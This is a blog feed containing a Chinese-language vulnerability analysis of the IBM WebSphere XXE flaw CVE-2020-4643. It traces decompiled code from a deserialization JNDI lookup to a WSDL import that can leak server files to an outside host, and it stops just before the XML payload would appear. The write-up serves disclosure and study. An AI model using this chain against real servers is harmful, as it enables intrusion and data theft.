<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Longofo&#39;s Blog</title>
  
  <subtitle>与码农的不解之缘</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://longofo.cc/"/>
  <updated>2020-09-23T11:51:10.528Z</updated>
  <id>http://longofo.cc/</id>
  
  <author>
    <name>Longofo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WebSphere XXE 漏洞分析(CVE-2020-4643)</title>
    <link href="http://longofo.cc/WebSphere%20XXE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-4643).html"/>
    <id>http://longofo.cc/WebSphere XXE 漏洞分析(CVE-2020-4643).html</id>
    <published>2020-09-23T11:45:39.000Z</published>
    <updated>2020-09-23T11:51:10.528Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>2020年9月17日，IBM发布了一个WebSphere XXE漏洞公告。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。</p></blockquote><h3 id="WebSphere-XXE漏洞分析-CVE-2020-4643"><a href="#WebSphere-XXE漏洞分析-CVE-2020-4643" class="headerlink" title="WebSphere XXE漏洞分析(CVE-2020-4643)"></a>WebSphere XXE漏洞分析(CVE-2020-4643)</h3><p><strong>作者：Longofo@知道创宇404实验室 &amp; r00t4dm@奇安信A-TEAM</strong></p><p><strong>时间：2020年9月21日</strong></p><p>2020年9月17日，IBM发布了一个WebSphere XXE<a href="https://www.ibm.com/support/pages/security-bulletin-websphere-application-server-vulnerable-information-exposure-vulnerability-cve-2020-4643" target="_blank" rel="noopener">漏洞公告</a>。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。</p><h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><p>先来看看补丁，只能看出是修复了一个XXE，不知道是哪儿的XXE：</p><p><img src="images/CVE-2020-4643/1.png" alt=""></p><p>可以看出这里是修复了一个XXE漏洞，但是这只是一个Utils，我们找到的那个XXE刚好也用了这个Utils。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>最开始研究WebSphere就是前不久的CVE-2020-4450，这个漏洞外面已经有分析了。为了更熟悉一点WebSphere，我们也去研究了历史补丁，例如印象比较深的就是前不久的CVE-2020-4276，这个漏洞算是历史漏洞CVE-2015-7450的认证方式绕过，RCE的过程与CVE-2015-7450没区别。后面意外的找到另一个反序列化入口，在确认了已经无法在历史漏洞上做文章的时，只好从readObject、readExternal、toString、compare等函数去尝试找下了，后来在一个readObject找到一个能JNDI注入的地方，但是由于sdk高版本的原因，能利用的方式就只能是本地factory或利用jndi本地反序列化了，但是WebSphere公开的利用链都被堵上了，本地反序列化其实没什么作用在这里，所以只剩下看本地Factory了。反序列化入口暂时先不给出，可能这样的反序列化入口还有很多，我们碰巧遇到了其中一个，如果后面有幸找到了RCE漏洞，就把我们找到的入口写出来，下面从那个readObject中的JNDI开始吧。</p><p>在<code>com.ibm.ws.ejb.portable.EJBMetaDataImpl#readObject</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">this</span>.ivStatelessSession = in.readBoolean();</span><br><span class="line">            ClassLoader loader = (ClassLoader)AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">this</span>.ivBeanClassName = in.readUTF();</span><br><span class="line">            <span class="keyword">this</span>.ivHomeClass = loader.loadClass(in.readUTF());</span><br><span class="line">            <span class="keyword">this</span>.ivRemoteClass = loader.loadClass(in.readUTF());</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.ivSession) &#123;</span><br><span class="line">                <span class="keyword">this</span>.ivPKClass = loader.loadClass(in.readUTF());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ivHomeHandle = (HomeHandle)in.readObject();</span><br><span class="line">            EJBHome ejbHomeStub = <span class="keyword">this</span>.ivHomeHandle.getEJBHome();<span class="comment">//ivHomeHandle是一个接口，我们找到了HomeHandleImpl，里面进行了JNDI查询，并且url可控</span></span><br><span class="line">            <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ejbHomeStub, <span class="keyword">this</span>.ivHomeClass);<span class="comment">//如果跟踪过CVE-2020-4450就能感觉到，这里十分类似CVE-2020-4450，不过缺少了后续的调用，无法像CVE-2020-4450利用WSIF的方式触发后续的RCE，WSIF之前那个XXE也被修复了</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.ws.ejb.portable.HomeHandleImpl#getEJBHome</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> EJBHome <span class="title">getEJBHome</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.ivEjbHome == <span class="keyword">null</span>) &#123;</span><br><span class="line">            NoSuchObjectException re;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">                InitialContext ctx;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.ivInitialContextProperties == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ctx = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.ivInitialContextProperties);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">                            ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(<span class="keyword">this</span>.ivJndiName), homeClass);<span class="comment">//进行了JNDI查询，ivJndiName是属性，很容易控制</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoInitialContextException var6) &#123;</span><br><span class="line">                    Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">                    p.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span>);</span><br><span class="line">                    ctx = <span class="keyword">new</span> InitialContext(p);</span><br><span class="line">                    <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(<span class="keyword">this</span>.ivJndiName), homeClass);</span><br><span class="line">                &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ivEjbHome;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果是sdk低版本，直接就是外部加载factory rce利用了，但是天不随人愿，如果这么容易就不会有CVE-2020-4450那种复杂的利用了。</p><p>接下来就只能一个一个看本地的factory了，也不多大概几十个，一个一个看吧。在<code>com.ibm.ws.webservices.engine.client.ServiceFactory#getObjectInstance</code>中，找到了那个XXE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object refObject, Name name, Context nameCtx, Hashtable environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refObject <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            Reference ref = (Reference)refObject;</span><br><span class="line">            RefAddr addr = ref.get(<span class="string">"service classname"</span>);</span><br><span class="line">            Object obj = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                instance = ClassUtils.forName((String)obj).newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                addr = ref.get(<span class="string">"WSDL location"</span>);</span><br><span class="line">                <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    URL wsdlLocation = <span class="keyword">new</span> URL((String)obj);</span><br><span class="line">                    addr = ref.get(<span class="string">"service namespace"</span>);</span><br><span class="line">                    <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                        String namespace = (String)obj;</span><br><span class="line">                        addr = ref.get(<span class="string">"service local part"</span>);</span><br><span class="line">                        <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                            String localPart = (String)obj;</span><br><span class="line">                            QName serviceName = QNameTable.createQName(namespace, localPart);</span><br><span class="line">                            Class[] formalArgs = <span class="keyword">new</span> Class[]&#123;URL.class, QName.class&#125;;</span><br><span class="line">                            Object[] actualArgs = <span class="keyword">new</span> Object[]&#123;wsdlLocation, serviceName&#125;;</span><br><span class="line">                            Constructor ctor = Service.class.getDeclaredConstructor(formalArgs);</span><br><span class="line">                            instance = ctor.newInstance(actualArgs);<span class="comment">//调用了Service构造函数</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            addr = ref.get(<span class="string">"maintain session"</span>);</span><br><span class="line">            <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; instance <span class="keyword">instanceof</span> Service) &#123;</span><br><span class="line">                ((Service)instance).setMaintainSession(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.ws.webservices.engine.client.Service#Service(java.net.URL, javax.xml.namespace.QName)</code>，在构造函数中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Service</span><span class="params">(URL wsdlLocation, QName serviceName)</span> <span class="keyword">throws</span> ServiceException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"Entry Service(URL, QName)  "</span> + serviceName.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.serviceName = serviceName;</span><br><span class="line">        <span class="keyword">this</span>.wsdlLocation = wsdlLocation;</span><br><span class="line">        Definition def = cachingWSDL ? (Definition)cachedWSDL.get(wsdlLocation.toString()) : <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (def == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Document doc = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                doc = XMLUtils.newDocument(wsdlLocation.toString());<span class="comment">//wsdlLocation外部可控，这里XMLUtils.newDocument进去就请求了wsdlLocation获取xml文件并解析</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                FFDCFilter.processException(var8, <span class="string">"com.ibm.ws.webservices.engine.client.Service.initService"</span>, <span class="string">"199"</span>, <span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(Messages.getMessage(<span class="string">"wsdlError00"</span>, <span class="string">""</span>, <span class="string">"\n"</span> + var8));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                WSDLFactory factory = <span class="keyword">new</span> WSDLFactoryImpl();</span><br><span class="line">                WSDLReader reader = factory.newWSDLReader();</span><br><span class="line">                reader.setFeature(<span class="string">"javax.wsdl.verbose"</span>, <span class="keyword">false</span>);</span><br><span class="line">                def = reader.readWSDL(wsdlLocation.toString(), doc);<span class="comment">//一开始我们只停留在了上面那个XMLUtils.newDocument，利用那儿的异常带不出去数据，由于是高版本sdk，外带也只能带一行数据。后来看到reader.readWSDL进去还能利用另一种方式外带全部数据</span></span><br><span class="line">                <span class="keyword">if</span> (cachingWSDL) &#123;</span><br><span class="line">                    cachedWSDL.put(wsdlLocation.toString(), def);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                FFDCFilter.processException(var7, <span class="string">"com.ibm.ws.webservices.engine.client.Service.initService"</span>, <span class="string">"293"</span>, <span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(Messages.getMessage(<span class="string">"wsdlError00"</span>, <span class="string">""</span>, <span class="string">"\n"</span> + var7));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.initService(def);</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"Exit Service(URL, QName)  "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.wsdl.xml.WSDLReaderImpl#readWSDL(java.lang.String, org.w3c.dom.Document)</code>之后，会调用到一个<code>com.ibm.wsdl.xml.WSDLReaderImpl#parseDefinitions</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Definition <span class="title">parseDefinitions</span><span class="params">(String documentBaseURI, Element defEl, Map importedDefs)</span> <span class="keyword">throws</span> WSDLException </span>&#123;</span><br><span class="line">    checkElementName(defEl, Constants.Q_ELEM_DEFINITIONS);</span><br><span class="line">    WSDLFactory factory = <span class="keyword">this</span>.getWSDLFactory();</span><br><span class="line">    Definition def = factory.newDefinition();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.extReg != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setExtensionRegistry(<span class="keyword">this</span>.extReg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = DOMUtils.getAttribute(defEl, <span class="string">"name"</span>);</span><br><span class="line">    String targetNamespace = DOMUtils.getAttribute(defEl, <span class="string">"targetNamespace"</span>);</span><br><span class="line">    NamedNodeMap attrs = defEl.getAttributes();</span><br><span class="line">    <span class="keyword">if</span> (importedDefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">        importedDefs = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (documentBaseURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setDocumentBaseURI(documentBaseURI);</span><br><span class="line">        ((Map)importedDefs).put(documentBaseURI, def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setQName(<span class="keyword">new</span> QName(targetNamespace, name));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (targetNamespace != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setTargetNamespace(targetNamespace);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> size = attrs.getLength();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        Attr attr = (Attr)attrs.item(i);</span><br><span class="line">        String namespaceURI = attr.getNamespaceURI();</span><br><span class="line">        String localPart = attr.getLocalName();</span><br><span class="line">        String value = attr.getValue();</span><br><span class="line">        <span class="keyword">if</span> (namespaceURI != <span class="keyword">null</span> &amp;&amp; namespaceURI.equals(<span class="string">"http://www.w3.org/2000/xmlns/"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (localPart != <span class="keyword">null</span> &amp;&amp; !localPart.equals(<span class="string">"xmlns"</span>)) &#123;</span><br><span class="line">                def.addNamespace(localPart, value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                def.addNamespace((String)<span class="keyword">null</span>, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Element tempEl = DOMUtils.getFirstChildElement(defEl); tempEl != <span class="keyword">null</span>; tempEl = DOMUtils.getNextSiblingElement(tempEl)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_IMPORT, tempEl)) &#123;</span><br><span class="line">            def.addImport(<span class="keyword">this</span>.parseImport(tempEl, def, (Map)importedDefs));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_DOCUMENTATION, tempEl)) &#123;</span><br><span class="line">            def.setDocumentationElement(tempEl);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_TYPES, tempEl)) &#123;</span><br><span class="line">            def.setTypes(<span class="keyword">this</span>.parseTypes(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_MESSAGE, tempEl)) &#123;</span><br><span class="line">            def.addMessage(<span class="keyword">this</span>.parseMessage(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_PORT_TYPE, tempEl)) &#123;</span><br><span class="line">            def.addPortType(<span class="keyword">this</span>.parsePortType(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_BINDING, tempEl)) &#123;</span><br><span class="line">            def.addBinding(<span class="keyword">this</span>.parseBinding(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_SERVICE, tempEl)) &#123;</span><br><span class="line">            def.addService(<span class="keyword">this</span>.parseService(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            def.addExtensibilityElement(<span class="keyword">this</span>.parseExtensibilityElement(Definition.class, tempEl, def));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.parseExtensibilityAttributes(defEl, Definition.class, def, def);</span><br><span class="line">    <span class="keyword">return</span> def;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.wsdl.xml.WSDLReaderImpl#parseImport</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Import <span class="title">parseImport</span><span class="params">(Element importEl, Definition def, Map importedDefs)</span> <span class="keyword">throws</span> WSDLException </span>&#123;</span><br><span class="line">        Import importDef = def.createImport();</span><br><span class="line"></span><br><span class="line">        String locationURI;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String namespaceURI = DOMUtils.getAttribute(importEl, <span class="string">"namespace"</span>);</span><br><span class="line">            locationURI = DOMUtils.getAttribute(importEl, <span class="string">"location"</span>);<span class="comment">//获取location属性</span></span><br><span class="line">            String contextURI = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (namespaceURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">                importDef.setNamespaceURI(namespaceURI);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (locationURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">                importDef.setLocationURI(locationURI);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.importDocuments) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        contextURI = def.getDocumentBaseURI();</span><br><span class="line">                        Definition importedDef = <span class="keyword">null</span>;</span><br><span class="line">                        InputStream inputStream = <span class="keyword">null</span>;</span><br><span class="line">                        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line">                        URL url = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.loc != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            inputSource = <span class="keyword">this</span>.loc.getImportInputSource(contextURI, locationURI);</span><br><span class="line">                            String liu = <span class="keyword">this</span>.loc.getLatestImportURI();</span><br><span class="line">                            importedDef = (Definition)importedDefs.get(liu);</span><br><span class="line">                            <span class="keyword">if</span> (inputSource.getSystemId() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                inputSource.setSystemId(liu);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            URL contextURL = contextURI != <span class="keyword">null</span> ? StringUtils.getURL((URL)<span class="keyword">null</span>, contextURI) : <span class="keyword">null</span>;</span><br><span class="line">                            url = StringUtils.getURL(contextURL, locationURI);</span><br><span class="line">                            importedDef = (Definition)importedDefs.get(url.toString());</span><br><span class="line">                            <span class="keyword">if</span> (importedDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                inputStream = StringUtils.getContentAsInputStream(url);<span class="comment">//进行了请求，可以通过这个请求将数据外带，但是还是有些限制，例如有&amp;或"等字符的文件会报错导致带不了</span></span><br><span class="line">                                ...</span><br><span class="line">                                ...</span><br></pre></td></tr></table></figure><p>xml payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 